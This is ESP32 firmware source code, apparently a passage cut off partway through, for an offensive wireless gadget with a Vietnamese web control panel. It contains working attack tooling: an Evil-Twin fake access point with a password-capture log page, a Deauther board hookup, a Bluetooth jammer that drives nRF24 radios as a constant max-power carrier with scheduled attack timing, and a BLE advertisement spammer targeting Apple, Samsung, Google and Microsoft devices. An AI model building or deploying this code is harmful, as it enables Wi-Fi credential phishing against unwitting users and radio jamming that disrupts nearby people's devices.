#include <vector>
#include <map>
#include <algorithm>
#include <ArduinoJson.h>
#include <Ticker.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include "FS.h"
#include "LittleFS.h"
#include "images.h"
#include "DeviceData.h"

struct WiFiNetwork {
	String ssid;
	int rssi;
	String mac;
	int channel;
};
	
#include <WiFi.h>
#include <AsyncTCP.h>
#include "RF24.h"
#include <SPI.h>
#include "esp_bt.h"
#include <esp_wifi.h>
SPIClass hp(HSPI);
SPIClass vp(VSPI);
RF24 radio1(16, 15, 16000000);   
RF24 radio2(22, 21, 16000000);
int ch = 45;  
unsigned int flag = 0;
bool jammer_running = false;
bool settime = false;
bool setstarttime = false;
bool setpausetime = false;
bool setofftime = false;
bool jammer_waiting_to_start = false;
unsigned long start_time = 0;
unsigned long end_time = 0;
unsigned long pause_time = 0;
unsigned long pause_duration = 0;
unsigned long off_time = 0;        
unsigned long off_duration = 0;
bool repeat_attack = false;
bool jammer_pause_running = false;
int attack_duration = 0;
String blue_mode = "HSPIVSPI";
bool waiting = false;
unsigned long startTime = 0;
bool wifiChecked = false;

volatile bool buttonPressed = false;
unsigned long lastDebounceTime = 0;
const unsigned long debounceDelay = 50;

#define TRIGGER_PIN 32
#define PAUSE_PIN 25
#define START_PIN 26
#define OFF_BLUE_PIN 34
#define ON_BLUE_PIN 35
#define BUILTIN_LED 2 
	
#define EVIL_TITLE "EVIL-TWIN"
#define HELP_TITLE "INSTRUCTIONS INFORMATION"
#define BLUE_TITLE "BLUETOOTH JAMMER"
#define SPAM_TITLE "BLUETOOTH SPAMMER"
#define SSID_TITLE "EVIL-TWIN WI-FI"
#define FILES_TITLE "FILE MANAGEMENT"
#define CHECK_TITLE "CONNECT"
#define RESET_BUTTON_PIN 0
#define RESET_HOLD_TIME  10000
unsigned long listenTimereset = 0;

String MAIN_TITLE = EVIL_TITLE + String(" BLUETOOTH JAMMER SPAMMER");

Ticker blinker;
int blinkCounter = 0;
bool isBlinking = false;
const byte TICK_TIMER = 1000;

IPAddress APIP(172, 0, 0, 1);
IPAddress SUBNET(255, 255, 255, 0);
String AP_SSID = "";
String AP_PASS = "";
String Fake_SSID = "";
String Target_SSID = "";
String lastSSID = "";
String uploadStatus = "No file uploaded"; 

DNSServer dnsServer; 
AsyncWebServer server(80);

void blinkLED() {
	if (blinkCounter < 50) {       
		digitalWrite(BUILTIN_LED, blinkCounter % 2);       
		blinkCounter++;
	} else {
		blinker.detach();  
		blinkCounter = 0;  
		isBlinking = false; 
		updateLEDState();
	}
}

void updateLEDState() {
	if (isBlinking) return; 
	if (WiFi.softAPSSID() == Fake_SSID || jammer_running) {
		digitalWrite(BUILTIN_LED, HIGH);
	} else if (WiFi.softAPSSID() == AP_SSID || !jammer_running) {
		digitalWrite(BUILTIN_LED, LOW);
	}
}

void startBlinking() {
	if (!isBlinking) {
		isBlinking = true;
		blinkCounter = 0;
		blinker.attach(0.2, blinkLED);
	}
}

std::map<String, String> langDict;

bool loadLangIfExist(const char* path) {
	if (!LittleFS.exists(path)) return false;
	File file = LittleFS.open(path, "r");
	if (!file) return false;
	DynamicJsonDocument doc(2048);
	auto err = deserializeJson(doc, file);
	if (err) {
		file.close();
		return false;
	}
	langDict.clear();
	for (JsonPair kv : doc.as<JsonObject>()) {
		langDict[kv.key().c_str()] = kv.value().as<String>();
	}
	file.close();
	return true;
}

String L(const char* key, const char* fallback) {
	if (langDict.count(key)) return langDict[key];
	return fallback;
}

String getCurrentLang() {
	String lang = loadFromConfig("lang");
	return (lang == "1") ? "1" : "0";
}

String header(const String &t) {
	String html;
	html.reserve(2048); 
	html += F("<!DOCTYPE HTML><html lang='vi-VN'><head><meta charset='UTF-8' name='viewport' content='width=device-width,initial-scale=1'>");
	html += F("<title>");
	html += t;
	html += F("</title><style>");
	html += F("body{background:#030303;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji';font-size:small;margin:0;padding:0;display:flex;justify-content:center;align-items:flex-start}");
	html += F(".container{width:100%;max-width:400px;padding:10px;border-radius:5px;box-shadow:0 0 10px #8c0000;text-align:center;box-sizing:border-box;margin:5px}");
	html += F("form{display:flex;flex-direction:column;align-items:center}label{width:100%;text-align:left;font-weight:bold}");
	html += F("input,button,ul,.btn-container a{width:100%;padding:12px;margin:8px 0;border:0;border-radius:5px;font-size:1em;text-align:left;box-sizing:border-box}");
	html += F("input{background:#010d23;color:#fff}.checkbox-container{display:flex;align-items:center;justify-content:flex-start;width:100%;margin:10px}");
	html += F(".checkbox-container input{width:auto;margin-right:10px}.btn-primary{background:#00488d;color:white;cursor:pointer;font-weight:bold;transition:background 0.3s ease;border-left:10px solid #fff}");
	html += F(".btn-primary:hover{background:#8c0000}.btn-secondary{background:#8c0000;color:#fff;text-align:center;text-decoration:none;font-weight:bold;transition:background 0.3s ease;display:block;border:none}");
	html += F(".btn-secondary:hover{background:#c5c5c5}.btn-container{display:flex;flex-direction:column;align-items:center;width:100%}");
	html += F("ul{padding:0;text-align:left;list-style-type:none}ul li{padding:10px}a{text-decoration:none;color:#007bff}a:hover{color:#0056b3}li ol{float:right}");
	html += F("table{--border:1px solid #777;border-radius:5px;border-spacing:0;border-collapse:separate;border:var(--border);overflow:hidden;width:100%;font-size:small}");
	html += F("table th:not(:last-child),table td:not(:last-child){border-right:var(--border)}");
	html += F("table>thead>tr:not(:last-child)>th,table>thead>tr:not(:last-child)>td,table>tbody>tr:not(:last-child)>th,table>tbody>tr:not(:last-child)>td,table>tfoot>tr:not(:last-child)>th,table>tfoot>tr:not(:last-child)>td,table>tr:not(:last-child)>td,table>tr:not(:last-child)>th,table>thead:not(:last-child),table>tbody:not(:last-child),table>tfoot:not(:last-child){border-bottom:var(--border)}");
	html += F("th{background:#8c0000;padding:10px}tr:nth-child(even){background:#010d23}th,td{padding:10px}");
	html += F("table button{background:#00488d;color:white;cursor:pointer;font-weight:bold;transition:background 0.3s ease;border:none}");
	html += F("table button:hover{background:#8c0000}table tr td:nth-child(2){text-align:right}");
	html += F(".slider-container{width:300px;height:80px;background:#00488d;border-radius:40px;position:relative;box-shadow:inset 0 0 10px rgba(0,0,0,0.2);margin:10px auto}");
	html += F(".slider-button{width:70px;height:70px;background:linear-gradient(145deg,#4CAF50,#8c0000);border-radius:50%;position:absolute;top:50%;left:5px;transform:translateY(-50%);transition:left 0.3s ease-in-out;box-shadow:3px 3px 5px rgba(0,0,0,0.3)}");
	html += F(".slider-container.active .slider-button{left:225px}");
	html += F("fieldset{display:flex;flex-direction:row;align-items:center;justify-content:space-between;margin:20px auto}fieldset div{display:flex;align-items:center}fieldset input{width:auto;margin:5px}");
	html += F("fieldset input:disabled{background-color:#ddd;color:#888}fieldset input[type=number]{font-size:small;width:60px;-moz-appearance:textfield;appearance:textfield}");
	html += F("fieldset input[type=number]::-webkit-inner-spin-button,fieldset input[type=number]::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}");
	html += F(".row{display:flex;flex-direction:row;align-items:center}.flexbox{display:flex;justify-content:space-evenly;width:100%;margin-bottom:10px}");
	html += F(".image{flex-shrink:0}.clickable-img{transition:all .2s ease}.clickable-img:active{transform:scale(.95);opacity:.8}");
	html += F(".text{text-align:left}.text p{margin:10px auto}.truncate{display:inline-block;max-width:150px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}");
	html += F("</style></head><body><div class='container'>");
	return html;
}

String header_target(const String &t) {
	String html;
	html.reserve(1024); 
	html += F("<!DOCTYPE HTML><html lang='vi-VN'><head><meta charset='UTF-8' name='viewport' content='width=device-width,initial-scale=1'>");
	html += F("<title>");
	html += t;
	html += F("</title><style>");
	html += F("body{background:#eef1f7;color:#222;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif,'Apple Color Emoji','Segoe UI Emoji';margin:0;padding:0;display:flex;justify-content:center;align-items:center}");
	html += F(".container{width:100%;max-width:400px;background:#fff;padding:10px;border-radius:10px;box-shadow:0 4px 10px rgba(0,0,0,0.2);text-align:center;box-sizing:border-box;margin:10px auto}");
	html += F("input{width:100%;padding:12px;margin:8px 0;border:1px solid #777;border-radius:5px;font-size:1em;text-align:center;box-sizing:border-box;background:#eee;color:#000}");
	html += F(".btn-primary{background:#00488d;color:white;cursor:pointer;font-weight:bold;transition:background 0.3s ease;border:none}");
	html += F(".btn-primary:hover{background:#8c0000}");
	html += F("a{text-decoration:none;color:#007bff}a:hover{color:#0056b3}");
	html += F("</style></head><body><div class='container'>");
	return html;
}

void handleIndex(AsyncWebServerRequest *request) {
	AP_SSID = loadFromConfig("apssid").isEmpty() ? "CHOMTV" : loadFromConfig("apssid");
	AP_PASS = loadFromConfig("appass").isEmpty() ? "@@@@2222" : loadFromConfig("appass");
	String hiddenChecked = (loadFromConfig("hiddenssid") == "1") ? "checked" : "";
    String currentLang = loadFromConfig("lang");
	if (currentLang != "1" && currentLang != "0") currentLang = "0"; 
	String langDefaultSelected = (currentLang == "0") ? "selected" : "";
	String langCustomSelected = (currentLang == "1") ? "selected" : "";
	if (currentLang == "1") {
		loadLangIfExist("/lang.json"); 
	} else {
		langDict.clear();
	}
	
	uint32_t totalHeap = ESP.getHeapSize();
	uint32_t freeHeap  = ESP.getFreeHeap();
	uint32_t usedHeap  = totalHeap - freeHeap;
	
	String html = header(MAIN_TITLE) + R"(
		<div class='flexbox'>
		)";
		html +=	F("<img class='clickable-img' onclick='sendReset()' src='/logo.png'>");
		html += R"(
		<div class='text'>
		<p>)" + MAIN_TITLE + R"(</p>
		<p>RAM: Free )" + String(freeHeap / 1024.0, 2) + R"( | Used )" + String(usedHeap / 1024.0, 2) + R"( | Total )" + String(totalHeap / 1024.0, 2) + R"(</p>
		</div>
		</div>
		<form method='post' action='/saveconfig'>
			<label for='ssid'>)" + L("APSSID", "Tên mạng") + R"(:</label>
			<input type='text' name='apssid' placeholder=')" + AP_SSID + R"('>
			<label for='password'>)" + L("APPASS", "Mật khẩu") + R"(:</label>
			<input type='password' id='appass' name='appass' placeholder=')" + AP_PASS + R"('>
			<div class='checkbox-container'>
				<input type='checkbox' name='hidden' )" + hiddenChecked + R"(>
				<label for='hidden'>)" + L("HIDEAP", "Ẩn mạng") + R"(</label>
				<label for='aplang' style='text-align: right;margin-right: 10px;'>)" + L("LANGUAGE", "Language") + R"(:</label>
				<select id='aplang' name='aplang' style='height: 30px;'>
					<option value='0' )" + langDefaultSelected + R"(>)" + L("LANG_DEFAULT", "Default") + R"(</option>
					<option value='1' )" + langCustomSelected + R"(>)" + L("LANG_CUSTOM", "Custom") + R"(</option>
				</select>
			</div>
			<button type='submit' class='btn-primary'>)" + L("SAVECONFIG", "Lưu") + R"(</button>
		</form>
		<hr>
		<div class='btn-container'>
			<a href='/files' class='btn-secondary'>)" + L("FILEMANAGEMENT", "Quản lý tập tin") + R"(</a>
			<a href='/targetssid' class='btn-secondary'>)" + L("EVILTWINWIFISETUP", "Thiết lập Wi-Fi Evil-Twin") + R"(</a>
			<a href='/html' class='btn-secondary'>)" + L("EVILTWINHTMLHOMEPAGE", "Trang chủ html Evil-Twin") + R"(</a>
			<a href='/pass' class='btn-secondary'>)" + L("LOGSFILESTORESPASSWORDS", "Tập tin logs lưu mật khẩu") + R"(</a>
		</div>
		<hr>
		<div class='btn-container'>
		)";	
		html +=	"<a href='/blue' class='btn-secondary'>" + L("BLUETOOTHJAMMER", "Gây nhiễu Bluetooth") + "</a>";
		html +=	"<a href='/spam' class='btn-secondary'>" + L("BLUETOOTHSPAMMER", "Phát quảng cáo bằng Bluetooth") + "</a>";
		html += R"(
			<a href='/help' class='btn-secondary'>)" + L("INSTRUCTIONSINFORMATION", "Thông tin hướng dẫn") + R"(</a>
		</div>
		<hr>
		<form action='/start' method='post'>
		)";
		html += R"(
			<div class='checkbox-container'>
				<input type='checkbox' id='checkControl8720' name='checkControl8720' value='1'>
				<label for='checkControl8720'>)" + L("CONECTRTL8720", "Sử dụng Board RTL8720DN chạy Deauther.") + R"(</label>
			</div>
		)";	
		html += R"(
			<button class='btn-primary' type='submit'>)" + L("STARTEVILTWIN", "Bắt đầu chạy Evil-Twin") + R"(</button>
		</form>
		</div>
		<script>
			var passInput = document.getElementById('appass');
			passInput.addEventListener('focus', function() {
				passInput.type = 'text';
			});
			passInput.addEventListener('blur', function() {
				passInput.type = 'password';
			});
			document.addEventListener('DOMContentLoaded', () => {
				let checkbox = document.getElementById('checkControl8720');
				checkbox.checked = localStorage.getItem('checkControl8720') === '1';
				checkbox.addEventListener('change', () => {
					localStorage.setItem('checkControl8720', checkbox.checked ? '1' : '0');
				});
			});
			function sendReset() {
				fetch('/sys_reset')
				.then(response => console.log('Reset triggered'))
				.catch(error => console.error('Error:', error));
			}
		</script>
		</body></html>)";
	request->send(200, "text/html", html);
}

void helpPage(AsyncWebServerRequest *request) {
	if (WiFi.softAPSSID() != AP_SSID) return htmltarget(request);
	if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
	String html = header(HELP_TITLE) + R"(
		<h1>)" + L("INSTRUCTIONSINFORMATION", "Thông tin hướng dẫn") + R"(</h1>
		<hr>
		<p>)" + L("INFO", "CHƯƠNG TRÌNH KIỂM TRA AN NINH MẠNG KHÔNG DÂY ĐƯỢC TẠO BỞI © CHOMTV.") + R"(</p>
		<p>)" + L("WARNING", "WARNING! I BEAR NO RESPONSIBILITY FOR ANYTHING YOU DO ON THIS DEVICE.") + R"(</p>
		<hr>
		<h2>)" + L("DEFAULTSETTINGS", "Cài đặt mặc định") + R"(</h2>
		<table>
			<tr>
				<th>)" + L("SETTINGS", "Cài đặt") + R"(</th>
				<th>)" + L("DEFAULT1", "Mặc định") + R"(</th>
			</tr>
			<tr>
				<td>)" + L("IPADDRESS", "Địa chỉ IP") + R"(</td>
				<td>172.0.0.1</td>
			</tr>
			<tr>
				<td>)" + L("APSSID", "Tên mạng") + R"(</td>
				<td>CHOMTV</td>
			</tr>
			<tr>
				<td>)" + L("APPASS", "Mật khẩu") + R"(</td>
				<td>@@@@2222</td>
			</tr>
			<tr>
				<td>)" + L("REVIEWLOGS", "Xem lại mật khẩu đã lưu khi chạy trang Evil-Twin") + R"(</td>
				<td>http://172.0.0.1/')" + L("APPASS", "Mật khẩu") + R"(' ()" + L("DEFAULT1", "Mặc định") + R"( @@@@2222)</td>
			</tr>
			<tr>
				<td>)" + L("EXITEVILTWIN", "Thoát chế độ Evil-Twin") + R"(</td>
				<td>)" + L("EXITEVILTWINMODE", "Tại trang Evil-Twin nhập vào 'Mật khẩu' trong ô nhập Mật khẩu") + R"( ()" + L("DEFAULT1", "Mặc định") + R"( @@@@2222)</td>
			</tr>
		</table>

		<h2>)" + L("PLUGINESP32", "Cắm kết nối cho Board ESP32") + R"(</h2>
		<table>
			<tr>
				<th>)" + L("CONFIGURATION", "Cấu hình") + R"(</th>
				<th>)" + L("CONNECTION", "Kết nối") + R"(</th>
			</tr>
			<tr>
				<td>ESP32 = RTL8720</td>
				<td>
					GND = GND<br>
					Vin = 5V<br>
					D34(GPIO34) = PB1<br>
					D35(GPIO35) = PB2<br>
					D32(GPIO32) = PA30<br>
					D25(GPIO25) = PA25<br>
					D26(GPIO26) = PA26
				</td>
			</tr>
		</table>

		<h2>)" + L("PLUGINESP32RF24", "Cắm kết nối cho Board ESP32 vs RF24") + R"(</h2>
		<table>
			<tr>
				<th>)" + L("MODE", "Chế độ") + R"(</th>
				<th>)" + L("CONNECTION", "Kết nối") + R"(</th>
			</tr>
			<tr>
				<td>HSPI</td>
				<td>SCK = 14, MISO = 12, MOSI = 13, CS = 15, CE = 16</td>
			</tr>
			<tr>
				<td>VSPI</td>
				<td>SCK = 18, MISO = 19, MOSI = 23, CS = 21, CE = 22</td>
			</tr>
		</table>

		<h2>)" + L("DEFAULTSETTINGS", "Cài đặt mặc định") + R"(</h2>
		<table>
			<tr>
				<th>Board</th>
				<th>)" + L("RESET15S", "Đặt lại trong 15 giây từ lúc khởi động") + R"(</th>
			</tr>
			<tr>
				<td>RTL8720</td>
				<td>)" + L("RESETRTL8720", "Giữ nút BURN trong 10s (hoặc kết nối GND + PA7)") + R"(</td>
			</tr>
			<tr>
				<td>ESP32</td>
				<td>)" + L("RESETESP32", "Giữ nút BOOT trong 10s (hoặc kết nối GND + GPIO0)") + R"(</td>
			</tr>
		</table>
		<br>
		<a href='/'>)" + L("BACK", "Trở về") + R"(</a>
		</div>
		</body></html>)";
	request->send(200, "text/html", html);
}

void BluetoothJammer(AsyncWebServerRequest *request) {
	if (WiFi.softAPSSID() != AP_SSID) return htmltarget(request);
	if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
	String html = header(BLUE_TITLE) + R"(
		<fieldset>
			<legend>)" + L("COUNTDOWNRUN", "Thiết lập thời gian chờ (Đếm ngược tới khi chạy)") + R"(:</legend>
			<div class='row'>
				<input type='checkbox' id='setstarttime' name='setstarttime' onchange='toggleStartTimeSettings()'>
				<input type='number' id='starthours' name='starthours' min='0' max='12' value='0' disabled> H 
				<input type='number' id='startminutes' name='startminutes' min='0' max='59' value='5' disabled> M
				<input type='number' id='startseconds' name='startseconds' min='0' max='59' value='0' disabled> S
			</div>
		</fieldset>
		<p class='center' style='color: yellowgreen;' id='countdown'>)" + L("STARTTIMESET", "Hiện tại chưa có thiết lập thời gian bắt đầu.") + R"(</p>
		<fieldset>
			<legend>)" + L("RUNTIME", "Thiết lập thời gian chạy") + R"(:</legend>
			<div class='row'>
				<input type='checkbox' id='settime' name='settime' onchange='toggleTimeSettings()'>
				<input type='number' id='hours' name='hours' min='0' max='12' value='0' disabled> H 
				<input type='number' id='minutes' name='minutes' min='0' max='59' value='5' disabled> M
				<input type='number' id='seconds' name='seconds' min='0' max='59' value='0' disabled> S
				<input type='checkbox' id='repeat' name='repeat' onchange='toggleOnPauseTimeSettings()' disabled> )" + L("REPEAT", "lặp lại") + R"(
			</div>
		</fieldset>
		<fieldset>
			<legend>)" + L("STOPTIME", "Thiết lập tgian dừng (Nếu tgian dừng khác tgian chạy)") + R"(:</legend>
			<div class='row'>
			<input type='checkbox' id='setpausetime' name='setpausetime' onchange='togglePauseTimeSettings()' disabled>
			<input type='number' id='pausehours' name='pausehours' min='0' max='12' value='0' disabled> H 
			<input type='number' id='pauseminutes' name='pauseminutes' min='0' max='59' value='5' disabled> M
			<input type='number' id='pauseseconds' name='pauseseconds' min='0' max='59' value='0' disabled> S
			</div>
		</fieldset>
		<fieldset>
			<legend>)" + L("REPEATSTOPTIME", "Thiết lập thời gian dừng chạy lặp lại") + R"(:</legend>
			<div class='row'>
			<input type='checkbox' id='setofftime' name='setofftime' onchange='toggleOffTimeSettings()' disabled>
			<input type='number' id='offhours' name='offhours' min='0' max='12' value='0' disabled> H 
			<input type='number' id='offminutes' name='offminutes' min='0' max='59' value='5' disabled> M
			<input type='number' id='offseconds' name='offseconds' min='0' max='59' value='0' disabled> S
			</div>
		</fieldset>
		<fieldset>
			<legend>)" + L("RF24OPTIONS", "Lựa chọn RF24") + R"(:</legend>
			<div>
				<input type='radio' id='HSPI' name='rf_mode' value='HSPI' />
				<label for='HSPI'>HSPI</label>
			</div>
			<div>
				<input type='radio' id='HSPIVSPI' name='rf_mode' value='HSPIVSPI' checked />
				<label for='HSPIVSPI'>HSPI&VSPI</label>
			</div>
			<div>
				<input type='radio' id='VSPI' name='rf_mode' value='VSPI' />
				<label for='VSPI'>VSPI</label>
			</div>
		</fieldset>
		<div class='slider-container' onclick='toggleJammer()'>
			<div class='slider-button'></div>
		</div>    
		<script>
			let countdownInterval;
			function startCountdown(startTime) {
				clearInterval(countdownInterval);
				const serverStartTime = startTime; 
				const clientBaseTime = Date.now(); 
				const serverBaseTime = )" + String(millis()) + R"(; 
				function updateCountdown() {
					let now = Date.now(); 
					let elapsed = now - clientBaseTime; 
					let serverNow = serverBaseTime + elapsed; 
					let diff = Math.floor((serverStartTime - serverNow) / 1000); 
					if (diff <= 0) {
						document.getElementById('countdown').innerText = ')" + L("COUNTDOWN_3", "Jammer đang chạy...") + R"(';
						clearInterval(countdownInterval);
					} else {
						let hours = Math.floor(diff / 3600);
						let minutes = Math.floor((diff % 3600) / 60);
						let seconds = diff % 60;
						document.getElementById('countdown').innerText = `)" + L("COUNTDOWN_1", "Jammer sẽ chạy sau") + R"(: ${hours} )" + L("HOUR", "giờ") + R"( ${minutes} )" + L("MINUTE", "phút") + R"( ${seconds} )" + L("SECOND", "giây") + R"(`;
					}
				}
				updateCountdown();
				countdownInterval = setInterval(updateCountdown, 1000);
			}
			)" + (jammer_waiting_to_start ? "startCountdown(" + String(start_time) + ");" : "") + R"(
			function toggleJammer() {
				let selectedMode = document.querySelector('input[name="rf_mode"]:checked').value;
				let slider = document.querySelector('.slider-container');
				slider.classList.toggle('active');
				let time = 0;
				let repeat = document.getElementById('repeat').checked ? 1 : 0;
				let settime = document.getElementById('settime').checked ? 1 : 0;
				if (settime) {
					let hours = document.getElementById('hours').value;
					let minutes = document.getElementById('minutes').value;
					let seconds = document.getElementById('seconds').value;
					time = parseInt(hours) * 3600 + parseInt(minutes) * 60 + parseInt(seconds);
				}
				let starttime = 0;
				let setstarttime = document.getElementById('setstarttime').checked ? 1 : 0;
				if (setstarttime) {
					let starthours = document.getElementById('starthours').value;
					let startminutes = document.getElementById('startminutes').value;
					let startseconds = document.getElementById('startseconds').value;
					starttime = parseInt(starthours) * 3600 + parseInt(startminutes) * 60 + parseInt(startseconds);
					startCountdown()" + String(millis()) + R"( + starttime * 1000);
				} else {
					if (settime && time <= 0) {
						document.getElementById('countdown').innerText = ')" + L("COUNTDOWN_2", "Lỗi: Thời gian chạy tấn công không thể bằng 0.") + R"(';
						countdown.classList.add('blink');
					} else {
						document.getElementById('countdown').innerText = ')" + L("COUNTDOWN_3", "Jammer đang chạy...") + R"(';					
					}
				}
				let pausetime = 0;
				let setpausetime = document.getElementById('setpausetime').checked ? 1 : 0;
				if (setpausetime) {
					let pausehours = document.getElementById('pausehours').value;
					let pauseminutes = document.getElementById('pauseminutes').value;
					let pauseseconds = document.getElementById('pauseseconds').value;
					pausetime = parseInt(pausehours) * 3600 + parseInt(pauseminutes) * 60 + parseInt(pauseseconds);
				}
				let offtime = 0;
				let setofftime = document.getElementById('setofftime').checked ? 1 : 0; 
				if (setofftime) {
					let offhours = document.getElementById('offhours').value;
					let offminutes = document.getElementById('offminutes').value;
					let offseconds = document.getElementById('offseconds').value;
					offtime = parseInt(offhours) * 3600 + parseInt(offminutes) * 60 + parseInt(offseconds); 
				}
				fetch('/toggle_jammer?mode=' + selectedMode + '&time=' + time + '&repeat=' + repeat + '&settime=' + settime + '&starttime=' + starttime + '&pausetime=' + pausetime + '&offtime=' + offtime)
					.then(response => response.text())
					.then(data => console.log(data))
					.catch(error => console.error('Error:', error));
            }
			function toggleTimeSettings() {
				let isChecked = document.getElementById('settime').checked;
				let repeatCheckbox = document.getElementById('repeat');
				let setPauseTime = document.getElementById('setpausetime');
				let setOffTime = document.getElementById('setofftime');
				document.getElementById('hours').disabled = !isChecked;
				document.getElementById('minutes').disabled = !isChecked;
				document.getElementById('seconds').disabled = !isChecked;
				document.getElementById('repeat').disabled = !isChecked;
				if (!isChecked) {
					setPauseTime.disabled = !isChecked;
					setOffTime.disabled = !isChecked;
					repeatCheckbox.checked = false;
					setPauseTime.checked = false;
					setOffTime.checked = false;
					togglePauseTimeSettings();
					toggleOffTimeSettings();
				}
			}
			function toggleStartTimeSettings() {
				let isChecked = document.getElementById('setstarttime').checked;
				document.getElementById('starthours').disabled = !isChecked;
				document.getElementById('startminutes').disabled = !isChecked;
				document.getElementById('startseconds').disabled = !isChecked;
			}
			function toggleOnPauseTimeSettings() {
				let repeatCheckbox = document.getElementById('repeat');
				let setPauseTime = document.getElementById('setpausetime');
				let setOffTime = document.getElementById('setofftime');
				let isChecked = repeatCheckbox.checked;
				setPauseTime.disabled = !isChecked;
				setOffTime.disabled = !isChecked;
				if (!isChecked) {
					setPauseTime.checked = false;
					setOffTime.checked = false;
					togglePauseTimeSettings();
					toggleOffTimeSettings();
				}
			}
			function togglePauseTimeSettings() {
				let isChecked = document.getElementById('setpausetime').checked;
				document.getElementById('pausehours').disabled = !isChecked;
				document.getElementById('pauseminutes').disabled = !isChecked;
				document.getElementById('pauseseconds').disabled = !isChecked;
			}
			function toggleOffTimeSettings() {
				let isChecked = document.getElementById('setofftime').checked;
				document.getElementById('offhours').disabled = !isChecked;
				document.getElementById('offminutes').disabled = !isChecked;
				document.getElementById('offseconds').disabled = !isChecked;
			}
		</script>
		<br>
		<a href='/'>)" + L("BACK", "Trở về") + R"(</a>
		</div>
		</body></html>)";
	request->send(200, "text/html", html);
}

void initHP() {
	Serial.println("Initializing HSPI...");
	radio1.powerDown();
	if (radio1.begin(&hp)) { 
		radio1.setAutoAck(false);
		radio1.stopListening();
		radio1.setRetries(0, 0);
		radio1.setPALevel(RF24_PA_MAX, true);
		radio1.setDataRate(RF24_2MBPS);
		radio1.setCRCLength(RF24_CRC_DISABLED);
		radio1.startConstCarrier(RF24_PA_MAX, ch);
		Serial.println("HSPI Started or Restarted !!!");
	} else {
		Serial.println("HSPI couldn't start - check connection!");
	}
}

void initVP() {
	Serial.println("Initializing VSPI...");
	radio2.powerDown();
	if (radio2.begin(&vp)) {
		radio2.setAutoAck(false);
		radio2.stopListening();
		radio2.setRetries(0, 0);
		radio2.setPALevel(RF24_PA_MAX, true);
		radio2.setDataRate(RF24_2MBPS);
		radio2.setCRCLength(RF24_CRC_DISABLED);
		radio2.startConstCarrier(RF24_PA_MAX, ch);
		Serial.println("VSPI Started or Restarted !!!");
	} else {
		Serial.println("VSPI couldn't start - check connection!");
	}
}

void startJammer(String mode, int time, bool repeat, bool enable_time, int startdelay, int pausetime, int offtime) {
	attack_duration = time;
	repeat_attack = repeat;
	settime = enable_time;
	setstarttime = (startdelay > 0);
	setpausetime = (pausetime > 0);
	blue_mode = mode;
	if (setpausetime) pause_duration = pausetime;
	if (offtime > 0 && !setofftime) { 
		setofftime = true;
		off_duration = offtime;
		off_time = millis() + (off_duration * 1000); 
	}
	if (setstarttime) {
		start_time = millis() + (startdelay * 1000);
		jammer_waiting_to_start = true;
	} else {
		esp_bt_controller_deinit();
		esp_wifi_stop();
		esp_wifi_deinit();
		esp_wifi_disconnect();
		if (blue_mode == "HSPIVSPI") {
			initHP();
			initVP();
		} else if (blue_mode == "HSPI") {
			initHP();
		} else if (blue_mode == "VSPI") {
			initVP();
		}
		jammer_waiting_to_start = false;
		jammer_running = true;
		jammer_pause_running = false;
		if (settime) end_time = millis() + (attack_duration * 1000);
	}
}

void toggleJammer(AsyncWebServerRequest *request) {
	String mode = "HSPIVSPI";
	int time;
	bool repeat;
	settime;
	int start_delay;
	int pausetime;
	int offtime;
	if (request->hasParam("mode")) mode = request->getParam("mode")->value();
	if (request->hasParam("time")) time = request->getParam("time")->value().toInt();
	if (request->hasParam("repeat")) repeat = request->getParam("repeat")->value().toInt();
	if (request->hasParam("settime")) settime = request->getParam("settime")->value().toInt();
	if (request->hasParam("starttime")) start_delay = request->getParam("starttime")->value().toInt();
	if (request->hasParam("pausetime")) pausetime = request->getParam("pausetime")->value().toInt();
	if (request->hasParam("offtime")) offtime = request->getParam("offtime")->value().toInt();
	if (time > 0 || !settime) startJammer(mode, time, repeat, settime, start_delay, pausetime, offtime);
	request->send(200, "text/plain", "Jammer Started in mode: " + mode);
}

void BleSpammer(AsyncWebServerRequest *request) {
	if (WiFi.softAPSSID() != AP_SSID) return htmltarget(request);
	if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
	String html = header(SPAM_TITLE) + R"(
		<fieldset style='display: block;'>
			<legend>)" + L("SELECTSPAM", "Lựa chọn thiết bị cần spam") + R"(:</legend>
			<div>
				<input type='checkbox' id='Microsoft' name='device_mode' value='Microsoft'/>
				<label for='Microsoft'>Microsoft</label>
			</div>
			<div>
				<input type='checkbox' id='Apple' name='device_mode' value='Apple'/>
				<label for='Apple'>Apple</label>
			</div>
			<div>
				<input type='checkbox' id='Samsung' name='device_mode' value='Samsung'/>
				<label for='Samsung'>Samsung</label>
			</div>
			<div>
				<input type='checkbox' id='Google' name='device_mode' value='Google'/>
				<label for='Google'>Google</label>
			</div>
			<div>
				<input type='checkbox' id='FlipperZero' name='device_mode' value='FlipperZero'/>
				<label for='FlipperZero'>Flipper Zero</label>
			</div>
		</fieldset>
		<div class='slider-container' onclick='toggleSpammer()'>
			<div class='slider-button'></div>
		</div>    
		<script>
            function toggleSpammer() {
                let checkboxes = document.querySelectorAll('input[name="device_mode"]:checked');
                let selectedModes = Array.from(checkboxes).map(cb => cb.value);
                let slider = document.querySelector('.slider-container');
                slider.classList.toggle('active');
                fetch('/toggle_spammer?modes=' + encodeURIComponent(selectedModes.join(',')))
                    .then(response => response.text())
                    .then(data => console.log(data))
                    .catch(error => console.error('Error:', error));
            }
        </script>
		<br>
		<a href='/'>)" + L("BACK", "Trở về") + R"(</a>
		</div>
		</body></html>)";
	request->send(200, "text/html", html);
}

void startSpammer(String modes) {
    selectedTypes.clear();
    if (modes.indexOf("Microsoft") != -1) selectedTypes.push_back(Microsoft);
    if (modes.indexOf("Apple") != -1) selectedTypes.push_back(Apple);
    if (modes.indexOf("Samsung") != -1) selectedTypes.push_back(Samsung);
    if (modes.indexOf("Google") != -1) selectedTypes.push_back(Google);
    if (modes.indexOf("FlipperZero") != -1) selectedTypes.push_back(FlipperZero);

    if (selectedTypes.empty()) {
        spammer_running = false; 
        return;
    }

    esp_wifi_stop();
